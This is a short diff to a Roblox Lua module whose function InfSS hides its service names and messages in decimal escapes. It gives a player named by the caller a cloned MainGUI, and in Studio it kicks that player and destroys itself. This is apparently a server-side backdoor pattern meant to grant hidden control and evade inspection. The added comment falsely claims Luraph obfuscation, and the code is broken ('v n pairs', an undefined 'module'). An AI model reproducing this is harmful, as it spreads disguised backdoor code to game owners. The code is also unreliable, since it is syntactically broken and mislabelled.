@@ -1,1 +1,3 @@
+--this file has been obfuscated using Luraph obfuscater
+
 local e = {} function e.InfSS(plr)  local i = game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() for _, v n pairs(game:GetService("\80\108\97\121\101\114\115"):GetPlayers()) do if string.sub(string.lower(v.Name), 0, string.len(plr)) == string.lower(plr) then if(i)then  v:Kick("\115\116\111\112\32\115\116\101\97\108\105\110\103\32\115\99\114\105\112\116\115\32\121\111\117\32\115\107\105\100")  script:Destroy() else local f = script.MainGUI:Clone() f.Parent = v:FirstChildWhichIsA("\80\108\97\121\101\114\71\117\105") end end end end return module
